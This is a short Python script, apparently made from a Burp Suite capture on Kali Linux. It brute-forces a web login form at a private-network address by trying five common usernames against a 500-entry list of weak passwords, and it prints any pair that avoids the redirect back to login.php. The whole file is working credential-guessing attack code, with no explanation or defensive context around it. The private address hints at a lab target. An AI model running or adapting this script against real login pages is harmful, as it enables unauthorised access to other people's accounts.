import requests

f = open("/home/kali/Desktop/500-worst-passwords.txt", "r")
# url for list https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/500-worst-passwords.txt
passwords = f.readlines()

users = [
    "guest",
    "test",
    "admin",
    "user",
    "root"
]

burp0_url = "http://192.168.100.51:80/login.php"

burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
}

for username in users:
    print(f"[*] Trying username: {username}")

    for x in passwords:
        password = x.strip()

        burp0_data = {
            "username": username,
            "password": password,
            "Login": "Login"
        }

        r = requests.post(
            burp0_url,
            headers=burp0_headers,
            data=burp0_data,
            allow_redirects=False
        )

        if 'login.php' == r.headers.get('Location'):
            pass
        else:
            print(f"[+] Credentials Found: {username}:{password}")
            break